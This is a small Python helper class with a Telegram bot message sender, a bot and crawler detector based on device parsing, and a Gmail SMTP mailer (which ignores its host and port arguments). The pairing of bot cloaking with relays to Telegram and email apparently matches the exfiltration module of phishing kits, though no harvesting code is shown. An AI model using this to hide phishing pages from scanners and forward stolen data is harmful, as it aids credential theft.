import requests
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from device_detector import DeviceDetector

class DOS():
   def __init__(self):
      pass
   
   
   def snTM(self, bt, cid, msg):
      api_url = f"https://api.telegram.org/bot{bt}/sendMessage"
      params = {'chat_id': cid, 'text': msg}
      try:
         response = requests.post(api_url, params=params)
         response.raise_for_status()
         return response.json()
      except requests.RequestException as e:
         print(f"Error sending message: {e}")
         return None
      
        
   def isBo(self, **kwargs):
      req = kwargs.get('req')
      device = DeviceDetector(req).parse()
      if device.is_bot() or device.os_name() == '': return True
      else: return False
      
   
   def sndm(self, hst, prt, snda_em, snda_pwd, r_mail, subj, msg):
      message = MIMEMultipart()
      message['From'] = snda_em
      message['To'] = r_mail
      message['Subject'] = subj
      message.attach(MIMEText(msg, 'plain'))

      try:
         smtp_server = smtplib.SMTP('smtp.gmail.com', 587)
         smtp_server.starttls()
         smtp_server.login(snda_em, snda_pwd)
      except smtplib.SMTPException as e:
         print(f"Error connecting to the SMTP server: {e}")
         return False
      
      try:
         smtp_server.sendmail(snda_em, r_mail, message.as_string())
         smtp_server.quit()
         print("Email sent successfully.")
         return True
      except smtplib.SMTPException as e:
         print(f"Error sending the email: {e}")
         return False